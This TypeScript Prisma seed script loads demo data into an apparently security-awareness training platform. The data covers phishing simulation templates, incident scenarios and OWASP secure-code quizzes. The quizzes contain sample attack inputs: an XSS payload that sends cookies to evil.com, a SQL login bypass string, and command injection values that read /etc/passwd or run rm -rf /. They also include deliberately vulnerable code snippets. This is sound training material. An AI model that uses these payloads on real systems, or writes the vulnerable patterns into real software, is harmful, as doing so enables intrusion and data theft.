import { PrismaClient } from '@prisma/client'
import argon2 from 'argon2'

const prisma = new PrismaClient()

async function main() {
  console.log('🌱 Seeding ShieldIQ demo data…')

  // ─── Demo Organisation ───────────────────────────────────────────────────────
  const org = await prisma.organisation.upsert({
    where: { slug: 'idfy' },
    update: {},
    create: {
      name: 'IDfy',
      slug: 'idfy',
      accentColor: '#CE1010',
      senderEmail: 'trust@idfy.com',
      senderName: 'IDfy TrustStack Team',
      appTitle: 'IDfy',
    },
  })
  console.log(`✓ Org: ${org.name}`)

  // ─── Departments ─────────────────────────────────────────────────────────────
  const deptData = [
    { name: 'Engineering', color: '#3b82f6' },
    { name: 'Finance', color: '#10b981' },
    { name: 'HR', color: '#8b5cf6' },
    { name: 'Sales', color: '#f59e0b' },
    { name: 'Operations', color: '#ef4444' },
  ]
  const depts = await Promise.all(
    deptData.map((d) =>
      prisma.department.upsert({
        where: { id: `seed-dept-${d.name.toLowerCase()}` },
        update: {},
        create: { id: `seed-dept-${d.name.toLowerCase()}`, orgId: org.id, ...d },
      }),
    ),
  )
  console.log(`✓ Departments: ${depts.map((d) => d.name).join(', ')}`)

  // ─── Modules ─────────────────────────────────────────────────────────────────
  const moduleData = [
    { name: 'Phishing Awareness 101', color: '#ef4444' },
    { name: 'Password Best Practices', color: '#3b82f6' },
    { name: 'Data Classification', color: '#8b5cf6' },
    { name: 'Social Engineering Awareness', color: '#f59e0b' },
    { name: 'Incident Reporting', color: '#10b981' },
    { name: 'Mobile Device Security', color: '#06b6d4' },
    { name: 'AI Awareness', color: '#ec4899' },
  ]
  const modules = await Promise.all(
    moduleData.map((m, i) =>
      prisma.module.upsert({
        where: { id: `seed-module-${i}` },
        update: {},
        create: { id: `seed-module-${i}`, orgId: org.id, ...m, sortOrder: i },
      }),
    ),
  )
  console.log(`✓ Modules: ${modules.map((m) => m.name).join(', ')}`)

  // ─── Admin user ──────────────────────────────────────────────────────────────
  const passwordHash = await argon2.hash('ShieldIQ-Demo-2026!', { type: argon2.argon2id, memoryCost: 65536, timeCost: 3, parallelism: 4 })
  await prisma.user.upsert({
    where: { orgId_email: { orgId: org.id, email: 'admin@idfy.com' } },
    update: {},
    create: {
      orgId: org.id,
      email: 'admin@idfy.com',
      name: 'Admin User',
      role: 'admin',
      passwordHash,
    },
  })
  console.log('✓ Admin user: admin@idfy.com / ShieldIQ-Demo-2026!')

  // ─── Sample employees ─────────────────────────────────────────────────────────
  const employeeData = [
    { name: 'Alice Johnson', email: 'alice@idfy.com', deptName: 'Engineering', role: 'Senior Engineer' },
    { name: 'Bob Smith', email: 'bob@idfy.com', deptName: 'Engineering', role: 'DevOps Engineer' },
    { name: 'Carol White', email: 'carol@idfy.com', deptName: 'Finance', role: 'Financial Analyst' },
    { name: 'David Lee', email: 'david@idfy.com', deptName: 'Finance', role: 'CFO' },
    { name: 'Eve Davis', email: 'eve@idfy.com', deptName: 'HR', role: 'HR Manager' },
    { name: 'Frank Wilson', email: 'frank@idfy.com', deptName: 'Sales', role: 'Sales Director' },
    { name: 'Grace Taylor', email: 'grace@idfy.com', deptName: 'Sales', role: 'Account Executive' },
    { name: 'Henry Brown', email: 'henry@idfy.com', deptName: 'Operations', role: 'IT Manager' },
    { name: 'Iris Martinez', email: 'iris@idfy.com', deptName: 'Operations', role: 'Sysadmin' },
    { name: 'Jack Anderson', email: 'jack@idfy.com', deptName: 'HR', role: 'Recruiter' },
  ]

  const deptMap = new Map(depts.map((d) => [d.name, d.id]))
  for (const emp of employeeData) {
    await prisma.employee.upsert({
      where: { orgId_email: { orgId: org.id, email: emp.email } },
      update: {},
      create: {
        orgId: org.id,
        deptId: deptMap.get(emp.deptName)!,
        name: emp.name,
        email: emp.email,
        role: emp.role,
      },
    })
  }
  console.log(`✓ Employees: ${employeeData.length} sample employees`)

  // ─── System Templates — Phishing ─────────────────────────────────────────────
  const phishingTemplates = [
    { name: 'IT Support Alert', icon: '🔧', description: 'Impersonates IT helpdesk requesting credentials for urgent maintenance.' },
    { name: 'CEO Spoof / BEC', icon: '👔', description: 'Business Email Compromise targeting finance team with wire transfer request.' },
    { name: 'Parcel Delivery', icon: '📦', description: 'Fake delivery notification with malicious link requiring user action.' },
    { name: 'HR / Payroll Update', icon: '💰', description: 'Urgent payroll details update request spoofing HR department.' },
    { name: 'Password Reset', icon: '🔐', description: 'Fake password expiry notification with credential harvesting page.' },
    { name: 'DocuSign / Shared File', icon: '📄', description: 'Fake document sharing notification requiring login to view.' },
    { name: 'AI Tool Invitation', icon: '🤖', description: 'Invitation to a new company-wide AI tool requiring account creation.' },
    { name: 'Fake Invoice', icon: '🧾', description: 'Overdue invoice notification targeting finance with malicious attachment.' },
  ]

  for (const t of phishingTemplates) {
    await prisma.template.upsert({
      where: { id: `sys-phish-${t.name.toLowerCase().replace(/\W+/g, '-')}` },
      update: {},
      create: {
        id: `sys-phish-${t.name.toLowerCase().replace(/\W+/g, '-')}`,
        orgId: org.id, isSystem: true, category: 'phishing', ...t,
        subject: `${t.name} — Action Required`,
        body: `<p>Dear {{name}},</p><p>${t.description}</p><p><a href="{{link}}">Click here to proceed</a></p>`,
      },
    })
  }

  // ─── System Templates — IS Awareness ─────────────────────────────────────────
  const awarenessTemplates = [
    { name: 'Phishing Awareness 101', icon: '🎣', description: 'Core phishing recognition and reporting training module.' },
    { name: 'Password Best Practices', icon: '🔑', description: 'Strong password creation, password managers, and MFA guidance.' },
    { name: 'Data Classification', icon: '🏷️', description: 'How to classify, handle, and protect sensitive company data.' },
    { name: 'Mobile Device Security', icon: '📱', description: 'Securing work devices, BYOD policy, and mobile threat awareness.' },
    { name: 'Incident Reporting', icon: '🚨', description: 'How to recognise and report a security incident promptly.' },
    { name: 'AI Awareness', icon: '🧠', description: 'Safe use of AI tools, data privacy risks, and prompt injection awareness.' },
  ]

  for (const t of awarenessTemplates) {
    await prisma.template.upsert({
      where: { id: `sys-aware-${t.name.toLowerCase().replace(/\W+/g, '-')}` },
      update: {},
      create: {
        id: `sys-aware-${t.name.toLowerCase().replace(/\W+/g, '-')}`,
        orgId: org.id, isSystem: true, category: 'awareness', ...t,
      },
    })
  }

  // ─── System Templates — Social Engineering ────────────────────────────────────
  const socialTemplates = [
    { name: 'Pretexting Scenario', icon: '🎭', description: 'Recognising fabricated scenarios used to extract information.' },
    { name: 'USB Drop Test', icon: '💾', description: 'Awareness around found USB drives and physical security.' },
    { name: 'Vishing (Voice Call)', icon: '📞', description: 'Voice phishing — recognising suspicious phone-based social engineering.' },
    { name: 'Tailgating / Piggybacking', icon: '🚪', description: 'Physical security awareness and access control best practices.' },
  ]

  for (const t of socialTemplates) {
    await prisma.template.upsert({
      where: { id: `sys-social-${t.name.toLowerCase().replace(/\W+/g, '-')}` },
      update: {},
      create: {
        id: `sys-social-${t.name.toLowerCase().replace(/\W+/g, '-')}`,
        orgId: org.id, isSystem: true, category: 'social', ...t,
      },
    })
  }

  console.log(`✓ System templates: ${phishingTemplates.length + awarenessTemplates.length + socialTemplates.length} total`)

  // ─── System Scenarios ─────────────────────────────────────────────────────────
  const scenarios = [
    {
      title: 'Ransomware Outbreak',
      phases: 4, injectCount: 8, durationMin: 180, difficulty: 'Intermediate', color: '#ef4444',
      tags: ['ransomware', 'incident-response', 'backups'],
      openingInject: 'Monday 08:47. Multiple employees report files have been encrypted and desktop backgrounds replaced with a ransom note. The helpdesk is flooded with calls. What are your immediate priorities?',
    },
    {
      title: 'Data Breach & PII Exfiltration',
      phases: 3, injectCount: 6, durationMin: 90, difficulty: 'Intermediate', color: '#8b5cf6',
      tags: ['data-breach', 'gdpr', 'exfiltration'],
      openingInject: 'Your DLP solution has triggered an alert showing large volumes of customer PII being transferred to an external IP. Initial investigation suggests an insider threat or compromised credentials.',
    },
    {
      title: 'Insider Threat Privilege Misuse',
      phases: 3, injectCount: 5, durationMin: 90, difficulty: 'Advanced', color: '#f59e0b',
      tags: ['insider-threat', 'access-control', 'forensics'],
      openingInject: 'HR has flagged a resigning employee in the finance department. Simultaneously, unusual database queries originating from their account have been flagged by your SIEM.',
    },
    {
      title: 'Supply Chain Compromise',
      phases: 4, injectCount: 7, durationMin: 120, difficulty: 'Advanced', color: '#06b6d4',
      tags: ['supply-chain', 'third-party', 'solarwinds-style'],
      openingInject: 'A widely-used software vendor in your supply chain has announced a compromise. You have the vendor\'s product deployed across 80% of your infrastructure. Initial forensics suggest your systems may have been beaconing for weeks.',
    },
    {
      title: 'DDoS & Business Continuity',
      phases: 2, injectCount: 4, durationMin: 60, difficulty: 'Basic', color: '#10b981',
      tags: ['ddos', 'availability', 'bcp'],
      openingInject: 'Your customer-facing website and API have been unreachable for 15 minutes. Network monitoring shows traffic volumes 500x above baseline. Revenue impact is estimated at £50k/hour.',
    },
    {
      title: 'CEO Fraud / BEC Attack',
      phases: 2, injectCount: 4, durationMin: 60, difficulty: 'Basic', color: '#ec4899',
      tags: ['bec', 'fraud', 'finance'],
      openingInject: 'Your finance director has received an urgent email appearing to be from the CEO requesting a £200,000 wire transfer to a new supplier for a confidential acquisition. The email references real internal project names.',
    },
    {
      title: 'AI System Compromise',
      phases: 3, injectCount: 5, durationMin: 90, difficulty: 'Intermediate', color: '#a78bfa',
      tags: ['ai', 'llm', 'prompt-injection'],
      openingInject: 'Your company\'s internal AI assistant has started returning unusual responses and appears to be executing unauthorised actions in connected business systems. A security researcher has contacted you suggesting a prompt injection attack.',
    },
  ]

  for (const s of scenarios) {
    await prisma.scenario.upsert({
      where: { id: `sys-scenario-${s.title.toLowerCase().replace(/\W+/g, '-')}` },
      update: {},
      create: {
        id: `sys-scenario-${s.title.toLowerCase().replace(/\W+/g, '-')}`,
        orgId: org.id, isSystem: true, ...s,
      },
    })
  }
  console.log(`✓ System scenarios: ${scenarios.length}`)

  // ─── Secure Code Training — OWASP Top 10 ──────────────────────────────────
  const owaspCourses = [
    {
      id: 'sys-owasp-a01',
      title: 'A01: Broken Access Control',
      subcategory: 'A01-Broken-Access-Control',
      icon: '🔓',
      color: '#ef4444',
      difficulty: 'Intermediate',
      description: 'Access control enforces policy so users cannot act outside their intended permissions. Broken access control allows unauthorised information disclosure, modification, or destruction of data.',
      content: `Broken Access Control is the #1 risk in the OWASP Top 10 (2021). It occurs when users can act outside their intended permissions.\n\nCommon vulnerabilities:\n• Bypassing access control checks by modifying the URL, application state, or HTML page\n• Allowing the primary key to be changed to another user's record (IDOR)\n• Elevation of privilege — acting as a user without being logged in, or acting as an admin when logged in as a user\n• Missing access control for POST, PUT, DELETE APIs\n• CORS misconfiguration allowing unauthorised API access`,
      challenges: [
        {
          id: 'sys-ch-a01-1',
          title: 'Insecure Direct Object Reference (IDOR)',
          description: 'This API endpoint lets any user view any other user\'s profile by changing the ID. What\'s the vulnerability?',
          type: 'mcq',
          language: 'javascript',
          codeSnippet: `app.get('/api/users/:id', (req, res) => {\n  const user = db.users.findById(req.params.id);\n  res.json(user);\n});`,
          correctAnswer: 'b',
          options: JSON.stringify([
            { id: 'a', label: 'SQL Injection — the id param is not sanitised' },
            { id: 'b', label: 'IDOR — No check that the logged-in user owns this record' },
            { id: 'c', label: 'XSS — User data is returned without encoding' },
            { id: 'd', label: 'CSRF — Missing anti-CSRF token' },
          ]),
          explanation: 'The endpoint returns any user\'s data based solely on the URL parameter. It never checks whether the authenticated user is authorised to view that specific record. This is a classic Insecure Direct Object Reference (IDOR). Fix: compare req.user.id === req.params.id or check role permissions.',
          points: 10,
        },
        {
          id: 'sys-ch-a01-2',
          title: 'Missing Function-Level Access Control',
          description: 'This admin route has a security flaw. Can you spot it?',
          type: 'mcq',
          language: 'javascript',
          codeSnippet: `// Admin panel route\napp.get('/admin/users', (req, res) => {\n  // Only shown in nav for admins, \n  // so this is "hidden" from normal users\n  const allUsers = db.users.findAll();\n  res.json(allUsers);\n});`,
          correctAnswer: 'a',
          options: JSON.stringify([
            { id: 'a', label: 'No server-side role check — hiding the link is not security' },
            { id: 'b', label: 'The route uses GET instead of POST' },
            { id: 'c', label: 'findAll() is a dangerous database function' },
            { id: 'd', label: 'The response should be XML, not JSON' },
          ]),
          explanation: 'Security through obscurity (hiding the nav link) is not real access control. Any user who knows or guesses the URL can access /admin/users. Fix: add middleware that verifies req.user.role === "admin" before processing the request.',
          points: 10,
        },
        {
          id: 'sys-ch-a01-3',
          title: 'Pick the Secure Fix',
          description: 'Which version properly prevents IDOR?',
          type: 'pick_fix',
          language: 'javascript',
          codeSnippet: `// VULNERABLE: Any user can delete any order\napp.delete('/api/orders/:orderId', async (req, res) => {\n  await db.orders.delete(req.params.orderId);\n  res.json({ success: true });\n});`,
          correctAnswer: 'b',
          options: JSON.stringify([
            { id: 'a', label: 'Add input validation', code: `app.delete('/api/orders/:orderId', async (req, res) => {\n  if (!isValidUUID(req.params.orderId)) return res.status(400).json({ error: 'Invalid ID' });\n  await db.orders.delete(req.params.orderId);\n  res.json({ success: true });\n});` },
            { id: 'b', label: 'Verify ownership before deleting', code: `app.delete('/api/orders/:orderId', async (req, res) => {\n  const order = await db.orders.findById(req.params.orderId);\n  if (!order || order.userId !== req.user.id) {\n    return res.status(403).json({ error: 'Forbidden' });\n  }\n  await db.orders.delete(req.params.orderId);\n  res.json({ success: true });\n});` },
            { id: 'c', label: 'Rate-limit the endpoint', code: `app.delete('/api/orders/:orderId', rateLimit({ max: 5 }), async (req, res) => {\n  await db.orders.delete(req.params.orderId);\n  res.json({ success: true });\n});` },
          ]),
          explanation: 'Option B is correct because it fetches the order first and verifies that the logged-in user owns it before allowing deletion. Input validation (A) and rate limiting (C) are good practices but don\'t prevent an authorised user from deleting another user\'s order.',
          points: 15,
        },
      ],
    },
    {
      id: 'sys-owasp-a02',
      title: 'A02: Cryptographic Failures',
      subcategory: 'A02-Cryptographic-Failures',
      icon: '🔐',
      color: '#f59e0b',
      difficulty: 'Intermediate',
      description: 'Failures related to cryptography which often lead to sensitive data exposure. Includes using weak algorithms, poor key management, and transmitting data in clear text.',
      content: `Cryptographic Failures (previously "Sensitive Data Exposure") focus on failures related to cryptography.\n\nKey areas:\n• Is any data transmitted in clear text (HTTP, SMTP, FTP)?\n• Are old or weak cryptographic algorithms used (MD5, SHA1, DES)?\n• Are encryption keys hardcoded or poorly managed?\n• Is proper randomness used for cryptographic purposes?\n• Are passwords stored using strong adaptive hashing (bcrypt, argon2)?`,
      challenges: [
        {
          id: 'sys-ch-a02-1',
          title: 'Weak Password Hashing',
          description: 'What is wrong with this password storage implementation?',
          type: 'mcq',
          language: 'javascript',
          codeSnippet: `const crypto = require('crypto');\n\nfunction hashPassword(password) {\n  return crypto\n    .createHash('md5')\n    .update(password)\n    .digest('hex');\n}`,
          correctAnswer: 'c',
          options: JSON.stringify([
            { id: 'a', label: 'The function name should be encryptPassword' },
            { id: 'b', label: 'It should use SHA-256 instead of MD5' },
            { id: 'c', label: 'MD5 is not suitable for passwords — use bcrypt or argon2 with salt' },
            { id: 'd', label: 'The digest should be base64, not hex' },
          ]),
          explanation: 'MD5 is a fast hash designed for integrity checks, not password storage. It\'s vulnerable to rainbow table attacks and can be brute-forced extremely quickly. Even SHA-256 (option B) is too fast. Passwords should use adaptive hashing algorithms like bcrypt, scrypt, or argon2 which are intentionally slow and include automatic salting.',
          points: 10,
        },
        {
          id: 'sys-ch-a02-2',
          title: 'Hardcoded Secrets',
          description: 'Identify the security issue in this code.',
          type: 'mcq',
          language: 'javascript',
          codeSnippet: `const jwt = require('jsonwebtoken');\n\nconst SECRET_KEY = 'myapp-secret-key-2024';\n\nfunction generateToken(user) {\n  return jwt.sign(\n    { userId: user.id, role: user.role },\n    SECRET_KEY,\n    { expiresIn: '30d' }\n  );\n}`,
          correctAnswer: 'b',
          options: JSON.stringify([
            { id: 'a', label: 'JWT tokens are inherently insecure' },
            { id: 'b', label: 'Secret key is hardcoded and weak — use env vars with strong random key' },
            { id: 'c', label: '30 days is too short for token expiry' },
            { id: 'd', label: 'User role should not be in the token payload' },
          ]),
          explanation: 'The secret key is hardcoded in source code, making it visible in version control and easy to guess. It should be stored in environment variables and generated with sufficient randomness (e.g., openssl rand -base64 32). The 30-day expiry is also long but the primary issue is the hardcoded weak key.',
          points: 10,
        },
      ],
    },
    {
      id: 'sys-owasp-a03',
      title: 'A03: Injection',
      subcategory: 'A03-Injection',
      icon: '💉',
      color: '#8b5cf6',
      difficulty: 'Beginner',
      description: 'Injection flaws such as SQL, NoSQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query.',
      content: `Injection attacks happen when an attacker can send malicious data to an interpreter.\n\nCommon types:\n• SQL Injection — manipulating database queries\n• NoSQL Injection — exploiting MongoDB/similar\n• Command Injection — executing OS commands\n• LDAP Injection — manipulating directory queries\n\nPrevention:\n• Use parameterised queries / prepared statements\n• Use ORM frameworks properly\n• Validate and sanitise all input\n• Apply least privilege to database accounts`,
      challenges: [
        {
          id: 'sys-ch-a03-1',
          title: 'Classic SQL Injection',
          description: 'This login query is vulnerable. What input would bypass authentication?',
          type: 'mcq',
          language: 'sql',
          codeSnippet: `// Node.js with raw SQL\nconst query = \`SELECT * FROM users \n  WHERE email = '\${email}' \n  AND password = '\${password}'\`;\n\nconst user = await db.query(query);`,
          correctAnswer: 'a',
          options: JSON.stringify([
            { id: 'a', label: "email: ' OR '1'='1' --  (bypasses auth by making WHERE always true)" },
            { id: 'b', label: 'email: <script>alert(1)</script>  (XSS attack)' },
            { id: 'c', label: 'email: admin@company.com  (brute force)' },
            { id: 'd', label: 'email: null  (null pointer exception)' },
          ]),
          explanation: "The query uses string interpolation to build SQL, allowing an attacker to inject SQL code. The input ' OR '1'='1' -- makes the WHERE clause always true and comments out the password check. Fix: use parameterised queries like db.query('SELECT * FROM users WHERE email = $1 AND password = $2', [email, password]).",
          points: 10,
        },
        {
          id: 'sys-ch-a03-2',
          title: 'Parameterised Query Fix',
          description: 'Which fix properly prevents SQL injection?',
          type: 'pick_fix',
          language: 'javascript',
          codeSnippet: `// VULNERABLE\nconst result = await db.query(\n  \`SELECT * FROM products WHERE name LIKE '%\${search}%'\`\n);`,
          correctAnswer: 'a',
          options: JSON.stringify([
            { id: 'a', label: 'Parameterised query', code: `const result = await db.query(\n  'SELECT * FROM products WHERE name LIKE $1',\n  ['%' + search + '%']\n);` },
            { id: 'b', label: 'Escape quotes only', code: `const safe = search.replace(/'/g, "''");\nconst result = await db.query(\n  \`SELECT * FROM products WHERE name LIKE '%\${safe}%'\`\n);` },
            { id: 'c', label: 'Limit input length', code: `const safe = search.substring(0, 50);\nconst result = await db.query(\n  \`SELECT * FROM products WHERE name LIKE '%\${safe}%'\`\n);` },
          ]),
          explanation: 'Parameterised queries (A) completely separate data from SQL code, making injection impossible. Escaping quotes (B) is fragile and error-prone — there are many bypass techniques. Length limiting (C) does not prevent injection at all.',
          points: 15,
        },
        {
          id: 'sys-ch-a03-3',
          title: 'Command Injection',
          description: 'This code runs a shell command with user input. What\'s the risk?',
          type: 'mcq',
          language: 'javascript',
          codeSnippet: `const { exec } = require('child_process');\n\napp.get('/api/ping', (req, res) => {\n  const host = req.query.host;\n  exec(\`ping -c 3 \${host}\`, (err, stdout) => {\n    res.send(stdout);\n  });\n});`,
          correctAnswer: 'b',
          options: JSON.stringify([
            { id: 'a', label: 'The ping command might time out' },
            { id: 'b', label: 'Command injection — user can append ; rm -rf / or other commands' },
            { id: 'c', label: 'The response should be JSON, not plain text' },
            { id: 'd', label: 'exec is slower than execSync' },
          ]),
          explanation: 'An attacker could send host=8.8.8.8; cat /etc/passwd to execute arbitrary commands on the server. The user input is directly interpolated into a shell command. Fix: use execFile() which doesn\'t invoke a shell, validate the host is a valid IP/hostname, or use a dedicated ping library.',
          points: 10,
        },
      ],
    },
    {
      id: 'sys-owasp-a07',
      title: 'A07: Cross-Site Scripting (XSS)',
      subcategory: 'A07-XSS',
      icon: '⚡',
      color: '#06b6d4',
      difficulty: 'Beginner',
      description: 'XSS flaws occur when an application includes unvalidated user-supplied data in a web page without proper encoding, allowing attackers to execute scripts in the victim\'s browser.',
      content: `Cross-Site Scripting (XSS) allows attackers to inject client-side scripts into web pages.\n\nTypes of XSS:\n• Reflected XSS — malicious script comes from the HTTP request\n• Stored XSS — malicious script is stored on the server (e.g., in a database)\n• DOM-based XSS — vulnerability exists in client-side code\n\nPrevention:\n• Encode output based on context (HTML, JavaScript, CSS, URL)\n• Use Content Security Policy (CSP) headers\n• Use frameworks that auto-escape by default (React, Angular)\n• Validate and sanitise HTML input with allowlists`,
      challenges: [
        {
          id: 'sys-ch-a07-1',
          title: 'Stored XSS in User Comments',
          description: 'A comment system renders user input directly. What\'s the fix?',
          type: 'mcq',
          language: 'html',
          codeSnippet: `<!-- Server renders this template -->\n<div class="comment">\n  <p class="author">{comment.username}</p>\n  <p class="body">{{{comment.body}}}</p>\n</div>\n\n<!-- User submits: -->\n<!-- body: <img src=x onerror="document.location='https://evil.com/?c='+document.cookie"> -->`,
          correctAnswer: 'b',
          options: JSON.stringify([
            { id: 'a', label: 'Block all HTML tags with a regex filter' },
            { id: 'b', label: 'Use {{comment.body}} (double-brace auto-escaping) instead of {{{triple-brace raw}}}' },
            { id: 'c', label: 'Limit comment length to 500 characters' },
            { id: 'd', label: 'Only allow comments from logged-in users' },
          ]),
          explanation: 'Triple-brace {{{...}}} in Handlebars/Mustache renders raw HTML without escaping. Double-brace {{...}} auto-escapes HTML entities, converting < to &lt; and preventing script execution. Regex-based tag filtering (A) is easily bypassed and not recommended.',
          points: 10,
        },
        {
          id: 'sys-ch-a07-2',
          title: 'DOM-Based XSS',
          description: 'This client-side code has a DOM XSS vulnerability. Can you spot it?',
          type: 'mcq',
          language: 'javascript',
          codeSnippet: `// Search page shows what user searched for\nconst params = new URLSearchParams(window.location.search);\nconst query = params.get('q');\n\ndocument.getElementById('search-term').innerHTML = \n  'Results for: ' + query;`,
          correctAnswer: 'a',
          options: JSON.stringify([
            { id: 'a', label: 'innerHTML renders HTML from URL param — use textContent instead' },
            { id: 'b', label: 'URLSearchParams is deprecated and insecure' },
            { id: 'c', label: 'The search results should be paginated' },
            { id: 'd', label: 'getElementById is slower than querySelector' },
          ]),
          explanation: 'Using innerHTML with untrusted data allows script injection. If the URL contains ?q=<img src=x onerror=alert(1)>, the browser will execute the injected code. Fix: use textContent which treats the value as plain text, not HTML.',
          points: 10,
        },
      ],
    },
  ]

  for (const course of owaspCourses) {
    const { challenges, ...courseData } = course
    await prisma.secureCodeCourse.upsert({
      where: { id: course.id },
      update: {},
      create: {
        ...courseData,
        orgId: org.id,
        category: 'owasp',
        isSystem: true,
        sortOrder: owaspCourses.indexOf(course),
      },
    })

    for (const ch of challenges) {
      await prisma.codeChallenge.upsert({
        where: { id: ch.id },
        update: {},
        create: {
          ...ch,
          courseId: course.id,
          options: typeof ch.options === 'string' ? JSON.parse(ch.options) : ch.options,
          sortOrder: challenges.indexOf(ch),
        },
      })
    }
  }
  console.log(`✓ OWASP Secure Code courses: ${owaspCourses.length} courses with challenges`)

  // ─── Secure Code Training — SDLC Security ─────────────────────────────────
  const sdlcCourses = [
    {
      id: 'sys-sdlc-requirements',
      title: 'Security in Requirements Phase',
      subcategory: 'Requirements',
      icon: '📋',
      color: '#10b981',
      difficulty: 'Beginner',
      description: 'Learn how to identify and document security requirements early in the SDLC to prevent costly fixes later.',
      content: `Security requirements should be defined alongside functional requirements.\n\nKey activities:\n• Identify regulatory requirements (GDPR, PCI-DSS, HIPAA)\n• Define authentication and authorisation requirements\n• Specify data classification and handling rules\n• Document encryption and key management needs\n• Establish logging and audit trail requirements\n• Define abuse cases alongside use cases`,
      challenges: [
        {
          id: 'sys-ch-sdlc-req-1',
          title: 'Security Requirements',
          description: 'Which of these is a properly defined security requirement?',
          type: 'mcq',
          language: 'javascript',
          codeSnippet: '',
          correctAnswer: 'c',
          options: JSON.stringify([
            { id: 'a', label: '"The system should be secure"' },
            { id: 'b', label: '"Use encryption where needed"' },
            { id: 'c', label: '"All PII must be encrypted at rest using AES-256 and in transit using TLS 1.2+"' },
            { id: 'd', label: '"Follow security best practices"' },
          ]),
          explanation: 'Good security requirements are specific, measurable, and testable. Option C specifies exactly what data (PII), what protection (encryption), what algorithm (AES-256), and what protocol (TLS 1.2+). Vague requirements like "be secure" cannot be verified or tested.',
          points: 10,
        },
      ],
    },
    {
      id: 'sys-sdlc-design',
      title: 'Secure Architecture & Design',
      subcategory: 'Design',
      icon: '📐',
      color: '#3b82f6',
      difficulty: 'Intermediate',
      description: 'Apply security design principles including threat modelling, defence in depth, and least privilege to build resilient architectures.',
      content: `Security by Design means incorporating security from the architecture phase.\n\nCore principles:\n• Defence in Depth — multiple layers of security controls\n• Least Privilege — minimum access necessary\n• Fail Secure — system defaults to secure state on failure\n• Separation of Duties — no single person has complete control\n• Threat Modelling — systematically identify threats (STRIDE)\n\nDesign review checklist:\n• Authentication mechanism chosen?\n• Data flow diagrams with trust boundaries?\n• Threat model completed (STRIDE/DREAD)?`,
      challenges: [
        {
          id: 'sys-ch-sdlc-design-1',
          title: 'STRIDE Threat Model',
          description: 'In the STRIDE threat model, what does the "E" stand for?',
          type: 'mcq',
          language: 'javascript',
          codeSnippet: '',
          correctAnswer: 'b',
          options: JSON.stringify([
            { id: 'a', label: 'Encryption — the threat of weak encryption' },
            { id: 'b', label: 'Elevation of Privilege — gaining unauthorised higher access' },
            { id: 'c', label: 'Exploitation — the act of exploiting a vulnerability' },
            { id: 'd', label: 'Exfiltration — stealing data from the system' },
          ]),
          explanation: 'STRIDE stands for: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege. Elevation of Privilege is when an attacker gains access to resources or capabilities beyond their authorised level.',
          points: 10,
        },
        {
          id: 'sys-ch-sdlc-design-2',
          title: 'Defence in Depth',
          description: 'Which architecture best demonstrates Defence in Depth?',
          type: 'mcq',
          language: 'javascript',
          codeSnippet: '',
          correctAnswer: 'c',
          options: JSON.stringify([
            { id: 'a', label: 'WAF → Application (relying solely on the WAF for protection)' },
            { id: 'b', label: 'Strong password policy only (single layer)' },
            { id: 'c', label: 'WAF → Rate Limiting → Input Validation → Parameterised Queries → DB Encryption' },
            { id: 'd', label: 'Firewall with all ports blocked (no access at all)' },
          ]),
          explanation: 'Defence in Depth uses multiple overlapping security controls. If the WAF is bypassed, rate limiting slows attacks, input validation catches malformed data, parameterised queries prevent injection, and DB encryption protects data at rest. Each layer compensates for potential failures in others.',
          points: 10,
        },
      ],
    },
    {
      id: 'sys-sdlc-testing',
      title: 'Security Testing & Code Review',
      subcategory: 'Testing',
      icon: '🧪',
      color: '#ec4899',
      difficulty: 'Intermediate',
      description: 'Master SAST, DAST, penetration testing, and secure code review techniques to catch vulnerabilities before production.',
      content: `Security testing should be integrated throughout the development process.\n\nTesting types:\n• SAST (Static Application Security Testing) — analyse source code\n• DAST (Dynamic Application Security Testing) — test running applications\n• IAST (Interactive AST) — combines SAST and DAST\n• SCA (Software Composition Analysis) — check dependencies\n• Penetration Testing — simulated real-world attacks\n• Code Review — manual security-focused review\n\nBest practices:\n• Integrate SAST into CI/CD pipeline\n• Run dependency scans (npm audit, Snyk) on every build\n• Perform manual pen-testing before major releases`,
      challenges: [
        {
          id: 'sys-ch-sdlc-test-1',
          title: 'SAST vs DAST',
          description: 'When should you use SAST vs DAST?',
          type: 'mcq',
          language: 'javascript',
          codeSnippet: '',
          correctAnswer: 'c',
          options: JSON.stringify([
            { id: 'a', label: 'SAST in production, DAST in development' },
            { id: 'b', label: 'Only DAST is needed — it catches everything' },
            { id: 'c', label: 'SAST during development (analyses code), DAST during QA/staging (tests running app)' },
            { id: 'd', label: 'SAST and DAST are the same thing' },
          ]),
          explanation: 'SAST analyses source code without running it (white-box), catching issues early in development. DAST tests the running application (black-box), finding runtime issues like misconfigurations. Both are complementary and should be used together in a mature SDLC.',
          points: 10,
        },
      ],
    },
  ]

  for (const course of sdlcCourses) {
    const { challenges, ...courseData } = course
    await prisma.secureCodeCourse.upsert({
      where: { id: course.id },
      update: {},
      create: {
        ...courseData,
        orgId: org.id,
        category: 'sdlc',
        isSystem: true,
        sortOrder: sdlcCourses.indexOf(course),
      },
    })

    for (const ch of challenges) {
      await prisma.codeChallenge.upsert({
        where: { id: ch.id },
        update: {},
        create: {
          ...ch,
          courseId: course.id,
          options: typeof ch.options === 'string' ? JSON.parse(ch.options) : ch.options,
          sortOrder: challenges.indexOf(ch),
        },
      })
    }
  }
  console.log(`✓ SDLC Secure Code courses: ${sdlcCourses.length} courses with challenges`)

  // ─── Content Library — Training Materials ──────────────────────────────────
  const contentItems = [
    {
      id: 'sys-content-phishing-101',
      title: 'How to Spot a Phishing Email',
      type: 'article',
      category: 'phishing',
      icon: '🎣',
      color: '#ef4444',
      difficulty: 'Beginner',
      duration: 8,
      description: 'Learn the key indicators of phishing emails and how to protect yourself from credential harvesting attacks.',
      content: `Phishing is the #1 attack vector used by cybercriminals. Here's how to spot one:\n\n1. CHECK THE SENDER\n• Hover over the "From" address — does it match the claimed sender?\n• Look for misspellings: "micros0ft.com" vs "microsoft.com"\n• Be suspicious of free email domains (gmail, yahoo) claiming to be corporate\n\n2. URGENCY & PRESSURE\n• "Your account will be suspended in 24 hours"\n• "Immediate action required"\n• Legitimate companies rarely create artificial urgency\n\n3. SUSPICIOUS LINKS\n• Hover before clicking — does the URL match the displayed text?\n• Look for lookalike domains: "paypa1.com" instead of "paypal.com"\n• Short URLs (bit.ly) in business emails are a red flag\n\n4. ATTACHMENTS\n• Never open unexpected attachments\n• Be cautious of .zip, .exe, .js, .docm files\n• Even PDFs can contain malicious links\n\n5. GRAMMAR & FORMATTING\n• Poor grammar and spelling errors\n• Generic greetings ("Dear Customer")\n• Inconsistent branding or formatting`,
      questions: [
        {
